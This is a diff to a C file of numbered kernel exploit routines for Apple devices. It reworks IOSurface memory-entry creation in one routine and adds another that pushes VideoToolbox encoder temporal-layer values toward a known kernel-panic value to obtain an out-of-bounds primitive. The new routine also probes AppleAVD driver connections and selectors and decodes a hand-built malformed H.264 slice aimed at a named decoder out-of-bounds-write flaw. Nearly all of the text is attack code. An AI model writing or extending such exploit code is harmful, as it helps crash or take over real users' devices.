@@ -17717,11 +17717,18 @@ static void r473_exploit(void) {
     CFRelease(ld);
     if (!large_surf) { rlog("    FAILED large surf\n"); close(fd); unlink(tmppath); return; }
     IOSurfaceLock(large_surf, 0, NULL);
-    memset(IOSurfaceGetBaseAddress(large_surf), 0xAA, R473_LARGE_SZ);
+    void *large_base = IOSurfaceGetBaseAddress(large_surf);
+    memset(large_base, 0xAA, R473_LARGE_SZ);
     IOSurfaceUnlock(large_surf, 0, NULL);
-    mach_port_t large_entry = IOSurfaceCreateMachPort(large_surf);
-    rlog("    large: %d pages, entry=0x%x, alloc=%d\n",
-         R473_LARGE_PG, large_entry,
+    /* Create VM memory entry from the IOSurface's mapped region */
+    mach_port_t large_entry = MACH_PORT_NULL;
+    memory_object_size_t large_me_sz = R473_LARGE_SZ;
+    kern_return_t lkr = mach_make_memory_entry_64(mach_task_self(),
+        &large_me_sz, (mach_vm_address_t)large_base,
+        VM_PROT_READ | VM_PROT_WRITE, &large_entry, MACH_PORT_NULL);
+    rlog("    large: %d pages, base=%p, me_kr=0x%x, entry=0x%x, me_sz=%llu, alloc=%d\n",
+         R473_LARGE_PG, large_base, lkr, large_entry,
+         (unsigned long long)large_me_sz,
          (int)IOSurfaceGetAllocSize(large_surf));
 
     /* Phase 2: Create SMALL IOSurface (1 page, 16K) */
@@ -17746,10 +17753,17 @@ static void r473_exploit(void) {
     CFRelease(sd);
     if (!small_surf) { rlog("    FAILED small surf\n"); close(fd); unlink(tmppath); CFRelease(large_surf); return; }
     IOSurfaceLock(small_surf, 0, NULL);
-    memset(IOSurfaceGetBaseAddress(small_surf), 0xBB, R473_SMALL_SZ);
+    void *small_base = IOSurfaceGetBaseAddress(small_surf);
+    memset(small_base, 0xBB, R473_SMALL_SZ);
     IOSurfaceUnlock(small_surf, 0, NULL);
-    mach_port_t small_entry = IOSurfaceCreateMachPort(small_surf);
-    rlog("    small: %d page, entry=0x%x\n", R473_SMALL_PG, small_entry);
+    mach_port_t small_entry = MACH_PORT_NULL;
+    memory_object_size_t small_me_sz = R473_SMALL_SZ;
+    kern_return_t skr = mach_make_memory_entry_64(mach_task_self(),
+        &small_me_sz, (mach_vm_address_t)small_base,
+        VM_PROT_READ | VM_PROT_WRITE, &small_entry, MACH_PORT_NULL);
+    rlog("    small: %d page, base=%p, me_kr=0x%x, entry=0x%x, me_sz=%llu\n",
+         R473_SMALL_PG, small_base, skr, small_entry,
+         (unsigned long long)small_me_sz);
 
     /* Phase 3: Search mapping */
     rlog("\n  --- Phase 3: Search mapping (%llu MiB) ---\n",
@@ -20144,6 +20158,368 @@ static void r478_exploit(void) {
     }
 
     rlog("\n=== r478 complete ===\n");
+    fflush(stdout);
+}
+
+/* ============================================================
+ * r479: Mutation verification + decoder OOB probe
+ *
+ * Critical question: does NTL mutation actually reach the kernel?
+ * Test: mutate NTL to 16463 (known panic value from SKVLENT).
+ * If kernel panics → mutation works, we have a real OOB primitive
+ * If no panic → mutation is userspace-only, kernel uses original NTL=8
+ *
+ * Also: probe the VIDEO DECODER (AppleAVD) path for CVE-2026-112689.
+ * This is triggered by crafted H.264 bitstream with malformed MMCO
+ * operation 6 in the DPB management. Use VTDecompressionSession.
+ * ============================================================ */
+
+static void r479_ave_cb(void *ref, void *src, OSStatus st,
+                         VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    if (ref) (*(int *)ref)++;
+}
+
+/* Create a minimal H.264 Annex B NAL unit with SPS+PPS+IDR */
+static void r479_make_h264_sps(uint8_t *buf, int *len) {
+    /* Minimal SPS for 64x64 baseline profile */
+    uint8_t sps[] = {
+        0x00, 0x00, 0x00, 0x01,  /* start code */
+        0x67,                     /* NAL type 7 = SPS */
+        0x42, 0xC0, 0x1E,        /* baseline profile, level 3.0 */
+        0xD9, 0x00, 0xA0, 0x47,  /* pic_width=64, pic_height=64 */
+        0xFE, 0x08,              /* max_num_ref_frames, gaps etc */
+    };
+    memcpy(buf, sps, sizeof(sps));
+    *len = sizeof(sps);
+}
+
+static void r479_make_h264_pps(uint8_t *buf, int *len) {
+    /* Minimal PPS */
+    uint8_t pps[] = {
+        0x00, 0x00, 0x00, 0x01,  /* start code */
+        0x68,                     /* NAL type 8 = PPS */
+        0xCE, 0x38, 0x80,        /* pic_param_set_id=0, etc */
+    };
+    memcpy(buf, pps, sizeof(pps));
+    *len = sizeof(pps);
+}
+
+static void r479_exploit(void) {
+    rlog("\n=== r479: NTL mutation verification + decoder OOB probe ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* ========== Test A: NTL mutation verification ========== */
+    /* If mutation reaches kernel, NTL=16463 should panic the device.
+     * We test with SMALLER values first (safe) then escalate.
+     * NTL=16463 is the SKVLENT panic value for 27.0.1. */
+    rlog("--- Test A: Verify mutation reaches kernel ---\n");
+    rlog("  If NTL>16000 via mutation panics → mutation works\n");
+    rlog("  If no panic → kernel ignores mutated NTL\n");
+    fflush(stdout);
+
+    /* First: create a session directly with NTL=9 (without mutation)
+     * to prove the kernel actually processes NTL during encode.
+     * This should crash/fail (as we saw in r474). */
+    rlog("\n  Direct NTL=9 test (no mutation, should fail/crash):\n");
+    fflush(stdout);
+    {
+        int cb = 0;
+        CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+        CFRelease(iop);
+        int pixfmt = kCVPixelFormatType_32BGRA;
+        CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+        CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+        CFRelease(fn);
+
+        VTCompressionSessionRef sess = NULL;
+        OSStatus st = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
+            NULL, sa, NULL, r479_ave_cb, &cb, &sess);
+        CFRelease(sa);
+
+        if (st == noErr && sess) {
+            CFNumberRef n;
+            int v = 1;
+            n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+            VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+            CFRelease(n);
+            VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+            v = 9;
+            n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+            OSStatus sp = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+            CFRelease(n);
+            rlog("    NTL=9 set: %d\n", (int)sp);
+
+            if (sp == noErr) {
+                st = VTCompressionSessionPrepareToEncodeFrames(sess);
+                rlog("    Prepare: %d\n", (int)st);
+                if (st == noErr) {
+                    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+                    CVPixelBufferRef pb = NULL;
+                    CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                    if (pb) {
+                        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 30),
+                            kCMTimeInvalid, NULL, NULL, NULL);
+                        rlog("    Encode: %d cb=%d\n", (int)st, cb);
+                        CVPixelBufferRelease(pb);
+                        VTCompressionSessionCompleteFrames(sess, kCMTimePositiveInfinity);
+                        rlog("    After flush: cb=%d\n", cb);
+                    }
+                }
+            }
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+        } else {
+            rlog("    Session create failed: %d\n", (int)st);
+        }
+    }
+    rlog("  (If we reach here, NTL=9 direct didn't kill us)\n");
+    fflush(stdout);
+
+    /* Now: mutate to NTL=9 and encode — if the kernel sees it, same crash */
+    rlog("\n  Mutation NTL=8→9 test:\n");
+    fflush(stdout);
+    {
+        int cb = 0;
+        CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+        CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault, NULL, NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+        CFRelease(iop);
+        int pixfmt = kCVPixelFormatType_32BGRA;
+        CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
+        CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+        CFRelease(fn);
+
+        VTCompressionSessionRef sess = NULL;
+        OSStatus st = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
+            NULL, sa, NULL, r479_ave_cb, &cb, &sess);
+        CFRelease(sa);
+
+        if (st == noErr && sess) {
+            CFNumberRef n;
+            int v = 1;
+            n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+            VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n);
+            CFRelease(n);
+            VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+
+            /* Initial NTL=8 (safe) */
+            v = 8;
+            n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+            VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+            CFRelease(n);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(sess);
+            rlog("    Prepare (NTL=8): %d\n", (int)st);
+
+            if (st == noErr) {
+                /* Safe encode */
+                CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    rlog("    Safe encode (NTL=8): %d cb=%d\n", (int)st, cb);
+                    CVPixelBufferRelease(pb);
+                }
+
+                /* Mutate to NTL=9 */
+                v = 9;
+                n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
+                OSStatus sp = VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                rlog("    Set NTL=9: %d\n", (int)sp);
+
+                /* Encode with mutated NTL */
+                pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    rlog("    Encoding with mutated NTL=9...\n");
+                    fflush(stdout);
+                    st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(1, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    rlog("    Encode: %d cb=%d\n", (int)st, cb);
+                    CVPixelBufferRelease(pb);
+                    VTCompressionSessionCompleteFrames(sess, kCMTimePositiveInfinity);
+                    rlog("    After flush: cb=%d\n", cb);
+                }
+            }
+            VTCompressionSessionInvalidate(sess);
+            CFRelease(sess);
+        }
+    }
+    rlog("  (If we reach here, mutation NTL=8→9 didn't kill us either)\n");
+    rlog("  → Conclusion: if direct NTL=9 killed but mutation didn't,\n");
+    rlog("    then mutation is USERSPACE ONLY and doesn't reach kernel.\n");
+    fflush(stdout);
+
+    /* ========== Test B: Video decoder probe (AppleAVD) ========== */
+    rlog("\n--- Test B: AppleAVD decoder probe ---\n");
+    rlog("  CVE-2026-112689: H.264 DPB MMCO OOB write in decoder\n");
+    fflush(stdout);
+    {
+        /* Check if AppleAVD IOKit service is accessible */
+        io_service_t avd_svc = IOServiceGetMatchingService(
+            kIOMainPortDefault, IOServiceMatching("AppleAVD"));
+        rlog("  AppleAVD service: 0x%x\n", avd_svc);
+
+        if (avd_svc) {
+            for (int type = 0; type <= 7; type++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = IOServiceOpen(avd_svc, mach_task_self(), type, &conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    rlog("  AVD Type %d: opened (conn=0x%x)\n", type, conn);
+
+                    /* Probe selectors */
+                    for (uint32_t sel = 0; sel <= 15; sel++) {
+                        uint64_t out[4] = {};
+                        uint32_t outcnt = 4;
+                        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out, &outcnt);
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                            rlog("    sel %d: kr=0x%x out=[0x%llx,0x%llx]\n",
+                                 sel, kr, out[0], out[1]);
+                        }
+                    }
+                    IOServiceClose(conn);
+                } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                    rlog("  AVD Type %d: kr=0x%x\n", type, kr);
+                }
+            }
+            IOObjectRelease(avd_svc);
+        }
+
+        /* Create a VTDecompressionSession to test decoder path */
+        rlog("\n  Creating H.264 VTDecompressionSession...\n");
+        fflush(stdout);
+
+        /* Build a minimal H.264 format description from SPS/PPS */
+        uint8_t sps_data[] = {
+            0x67, 0x42, 0xC0, 0x0A, 0xD9, 0x00, 0xA0, 0x47, 0xFE, 0x08
+        };
+        uint8_t pps_data[] = {
+            0x68, 0xCE, 0x38, 0x80
+        };
+
+        const uint8_t *param_sets[] = { sps_data, pps_data };
+        size_t param_sizes[] = { sizeof(sps_data), sizeof(pps_data) };
+
+        CMVideoFormatDescriptionRef fmt = NULL;
+        OSStatus fst = CMVideoFormatDescriptionCreateFromH264ParameterSets(
+            kCFAllocatorDefault,
+            2,              /* parameterSetCount */
+            param_sets,
+            param_sizes,
+            4,              /* NALUnitHeaderLength */
+            &fmt);
+        rlog("  Format description: %d\n", (int)fst);
+
+        if (fst == noErr && fmt) {
+            rlog("  Format created: %s\n",
+                 CFStringGetCStringPtr(
+                     CMFormatDescriptionGetExtension(fmt, kCMFormatDescriptionExtension_FormatName),
+                     kCFStringEncodingUTF8) ?: "unknown");
+
+            /* Create decompress session */
+            VTDecompressionOutputCallbackRecord dcb = {0};
+            VTDecompressionSessionRef dec_sess = NULL;
+            OSStatus dst = VTDecompressionSessionCreate(
+                kCFAllocatorDefault, fmt, NULL, NULL, &dcb, &dec_sess);
+            rlog("  Decompression session: %d\n", (int)dst);
+
+            if (dst == noErr && dec_sess) {
+                rlog("  Decoder session created successfully!\n");
+
+                /* Build a simple IDR slice with MMCO commands */
+                /* NAL unit type 5 (IDR), with dec_ref_pic_marking containing
+                 * MMCO operation 6 (long-term reference frame assignment) */
+                uint8_t idr_nal[] = {
+                    /* NALU header + slice header */
+                    0x65,                     /* NAL type 5 = IDR slice */
+                    0x88, 0x80, 0x40,         /* slice header: first_mb=0, type=I, pps_id=0 */
+                    0x00, 0x00,               /* frame_num=0, idr_pic_id=0 */
+                    /* dec_ref_pic_marking: */
+                    0x00,                     /* no_output_prior=0 */
+                    0x06,                     /* MMCO op 6: long_term_frame_idx assignment */
+                    0xFF,                     /* long_term_frame_idx = very large (overflow!) */
+                    0xFF, 0xFF, 0xFF,         /* padding / continuation */
+                    0x00,                     /* MMCO op 0: end */
+                    /* Minimal slice data */
+                    0x00, 0x00, 0x00, 0x00,
+                };
+
+                /* Wrap in AVCC length-prefixed format */
+                uint8_t nalu_buf[256];
+                uint32_t nalu_len = sizeof(idr_nal);
+                nalu_buf[0] = (nalu_len >> 24) & 0xFF;
+                nalu_buf[1] = (nalu_len >> 16) & 0xFF;
+                nalu_buf[2] = (nalu_len >> 8) & 0xFF;
+                nalu_buf[3] = nalu_len & 0xFF;
+                memcpy(nalu_buf + 4, idr_nal, nalu_len);
+
+                CMBlockBufferRef block = NULL;
+                OSStatus bst = CMBlockBufferCreateWithMemoryBlock(
+                    kCFAllocatorDefault,
+                    nalu_buf, 4 + nalu_len,
+                    kCFAllocatorNull, NULL,
+                    0, 4 + nalu_len,
+                    0, &block);
+                rlog("  Block buffer: %d\n", (int)bst);
+
+                if (bst == noErr && block) {
+                    CMSampleBufferRef sample = NULL;
+                    CMSampleTimingInfo timing = {
+                        .duration = CMTimeMake(1, 30),
+                        .presentationTimeStamp = CMTimeMake(0, 30),
+                        .decodeTimeStamp = kCMTimeInvalid
+                    };
+                    size_t sample_size = 4 + nalu_len;
+                    OSStatus sst = CMSampleBufferCreateReady(
+                        kCFAllocatorDefault,
+                        block, fmt,
+                        1, 1, &timing, 1, &sample_size,
+                        &sample);
+                    rlog("  Sample buffer: %d\n", (int)sst);
+
+                    if (sst == noErr && sample) {
+                        rlog("  Decoding malformed H.264 IDR with MMCO op 6...\n");
+                        fflush(stdout);
+
+                        VTDecodeFrameFlags flags = kVTDecodeFrame_EnableAsynchronousDecompression;
+                        VTDecodeInfoFlags info_flags;
+                        dst = VTDecompressionSessionDecodeFrame(
+                            dec_sess, sample, flags, NULL, &info_flags);
+                        rlog("  Decode result: %d info_flags=0x%x\n",
+                             (int)dst, (unsigned)info_flags);
+
+                        VTDecompressionSessionWaitForAsynchronousFrames(dec_sess);
+                        rlog("  Decode complete\n");
+
+                        CFRelease(sample);
+                    }
+                    CFRelease(block);
+                }
+
+                VTDecompressionSessionInvalidate(dec_sess);
+                CFRelease(dec_sess);
+            }
+            CFRelease(fmt);
+        }
+    }
+
+    rlog("\n=== r479 complete ===\n");
     fflush(stdout);
 }
 
